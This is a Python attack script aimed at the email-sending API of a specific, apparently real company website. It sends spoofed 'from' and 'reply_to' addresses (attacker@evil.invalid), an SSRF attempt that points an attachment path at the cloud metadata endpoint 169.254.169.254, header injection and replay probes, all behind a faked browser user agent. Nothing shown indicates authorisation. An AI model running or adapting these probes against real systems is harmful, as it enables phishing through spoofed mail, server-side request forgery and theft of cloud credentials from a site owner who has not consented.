import requests, json, time
S = requests.Session()
S.headers.update({'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36'})
HOST = 'www.' + 'infinitycapital' + '.bh'
B = 'https://' + HOST
URL = B + '/api/send'

def post(data, tag, hdrs=None):
    time.sleep(1.0)
    h = {'Content-Type':'application/x-www-form-urlencoded'}
    if hdrs: h.update(hdrs)
    try:
        r = S.post(URL, headers=h, data=data, timeout=25, allow_redirects=False)
        print(tag, r.status_code, '|', r.text[:400])
        return r
    except Exception as e:
        print(tag, 'ERR', type(e).__name__, str(e)[:100])

# 1) contract discovery: single 'to'
post({'to':'probe@'+'probe.local','subject':'x','body':'y'}, 'to+subject+body')
# 2) 'from' control?
post({'to':'probe@'+'probe.local','from':'attacker@evil.invalid','subject':'x','body':'y'}, 'from-spoof')
# 3) reply_to / config
post({'to':'probe@'+'probe.local','subject':'x','body':'y','reply_to':'attacker@evil.invalid'}, 'reply_to')
# 4) attachments (base64) -> could probe for SSRF/filetype handling
post({'to':'probe@'+'probe.local','subject':'x','body':'y','attachments[0][content]':'aGk=','attachments[0][filename]':'a.txt','attachments[0][path]':'http://169.254.169.254/latest/meta-data/'}, 'attach-path')
# 5) headers injection
post({'to':'probe@'+'probe.local','subject':'x','body':'y','headers':json.dumps({'X-Custom':'v'})}, 'custom-headers')
# 6) idempotency key / idempotency abuse (double send / replay)
post({'to':'probe@'+'probe.local','subject':'x','body':'y','Idempotency-Key':'abc123'}, 'idempotency')
